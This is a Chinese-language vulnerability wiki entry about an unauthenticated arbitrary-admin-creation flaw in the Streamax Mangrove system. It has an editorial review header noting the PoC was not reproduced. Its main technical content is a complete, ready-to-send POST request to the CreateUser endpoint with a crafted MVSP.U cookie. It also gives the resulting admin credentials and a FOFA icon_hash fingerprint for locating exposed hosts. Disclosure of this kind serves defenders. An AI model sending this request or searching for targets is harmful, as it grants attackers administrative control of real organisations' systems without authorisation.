---
source: "SourByte05/Vulnerability-Wiki-PoC"
id: "vw-bd84a3543e73bde398424199"
entity_id: "ve-bd84a3543e73bde398424199"
schema_version: "1"
fofa_unverified: "icon_hash="
title: "深圳市锐明技术股份有限公司Mangrove系统存在任意用户添加漏洞"
product: "Streamax锐明Mangrove"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "MVSP.U Cookie编码用户/角色；新旧版本登录值不同但版本未列"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/%E9%94%90%E6%98%8E%E6%8A%80%E6%9C%AF/%E6%B7%B1%E5%9C%B3%E5%B8%82%E9%94%90%E6%98%8E%E6%8A%80%E6%9C%AF%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8Mangrove%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "账户操作会新增用户或更改认证材料，可能使原用户失去访问；须核对角色、操作前账户状态及恢复路径"
source_status: "unknown"
---

# 深圳市锐明技术股份有限公司Mangrove系统存在任意用户添加漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Streamax锐明Mangrove
- 本文讨论：Mvsp/RoleUserInfo/Default.do CreateUser
- 版本、权限与配置前提：MVSP.U Cookie编码用户/角色；新旧版本登录值不同但版本未列
- 资料类型：用户创建复现；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 未说明Cookie是否任意伪造，未经认证声明需对照
- 新版本用原口令、旧版本用摘要登录的关键差异没给版本号
- 在野已知/影响广无来源；正文电话等样本应去敏
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 账户操作会新增用户或更改认证材料，可能使原用户失去访问；须核对角色、操作前账户状态及恢复路径

### 待核与来源

- Cookie校验、版本矩阵及成功结果待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 漏洞描述

Mangrove系统 /Mvsp/RoleUserInfo/Default.do 接口存在任意用户添加漏洞，未经身份验证的远程攻击者可以利用此漏洞添加任意管理员用户，导致攻击者可直接管理后台，造成信息泄露，使系统处于极不安全的状态。

# 影响版本

Mangrove系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：icon_hash="564025728"

POC/EXP：

POST /Mvsp/RoleUserInfo/Default.do?Action=CreateUser&Type=post&DataType=Text&Guid=1721290869914 HTTP/1.1
Host: 127.0.0.1
Content-Length: 243
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: MVSP.U=VUlEPTEmVU49YWRtaW4yJkdJRD0xJlJJRD0x;
Connection: close

UserId=&GroupPower=1&VehiclePower=&UserName=test123&RoleId=1&GroupId=1&ValidTime=&VideoTime=1&Enable=1&TelNo=18181818181&Flow=&WarningFlow=&RealFlow=&MonthlyTime=&Description=&Email=&Password=cf2004f91f001ff3d422d50ff009c4df

使用账号密码登录系统：
test123/qQq@123456
或者
test123/cf2004f91f001ff3d422d50ff009c4df
版本新的就是上面这个，版本低的就是下面这个

![image-20241010095912984](./.resource/深圳市锐明技术股份有限公司Mangrove系统存在任意用户添加漏洞/media/image-20241010095912984.png)


![image-20241010095955964](./.resource/深圳市锐明技术股份有限公司Mangrove系统存在任意用户添加漏洞/media/image-20241010095955964.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
